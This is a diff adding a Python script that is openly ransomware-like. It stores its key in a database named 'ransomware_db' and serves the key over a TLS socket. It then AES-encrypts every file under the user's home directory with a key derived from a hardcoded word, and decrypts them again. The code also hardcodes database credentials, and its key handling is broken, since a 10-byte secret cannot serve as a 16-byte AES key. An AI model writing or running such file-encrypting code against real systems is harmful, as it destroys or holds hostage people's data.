@@ -1,0 +1,73 @@
+import socket
+import ssl
+import mysql.connector
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import os
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind(('0.0.0.0', 12345))
+server_socket.listen(5)
+
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+
+secure_socket = context.wrap_socket(server_socket, server_side=True)
+client_socket, addr = secure_socket.accept()
+
+secret_word = "secret1234"
+client_socket.send(secret_word.encode())
+client_socket.close()
+
+def save_secret_to_db(secret_word):
+    connection = mysql.connector.connect(
+        host="localhost",
+        user="username",
+        password="password",
+        database="ransomware_db"
+    )
+    cursor = connection.cursor()
+    query = "INSERT INTO secrets (secret_word) VALUES (%s)"
+    cursor.execute(query, (secret_word,))
+    connection.commit()
+    connection.close()
+
+save_secret_to_db(secret_word)
+
+def encrypt_file(file_name, key):
+    with open(file_name, 'rb') as file:
+        file_data = file.read()
+    cipher = AES.new(key, AES.MODE_CBC)
+    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
+    with open(file_name, 'wb') as file:
+        file.write(cipher.iv + encrypted_data)
+
+def decrypt_file(file_name, key):
+    with open(file_name, 'rb') as file:
+        iv = file.read(16)
+        encrypted_data = file.read()
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+    with open(file_name, 'wb') as file:
+        file.write(decrypted_data)
+
+secret_key = secret_word.encode()[:16]
+file_name = "example.txt"
+encrypt_file(file_name, secret_key)
+decrypt_file(file_name, secret_key)
+
+def encrypt_all_files(directory, key):
+    for foldername, subfolders, filenames in os.walk(directory):
+        for filename in filenames:
+            file_path = os.path.join(foldername, filename)
+            encrypt_file(file_path, key)
+
+def decrypt_all_files(directory, key):
+    for foldername, subfolders, filenames in os.walk(directory):
+        for filename in filenames:
+            file_path = os.path.join(foldername, filename)
+            decrypt_file(file_path, key)
+
+user_directory = os.path.expanduser("~")
+encrypt_all_files(user_directory, secret_key)
+decrypt_all_files(user_directory, secret_key)
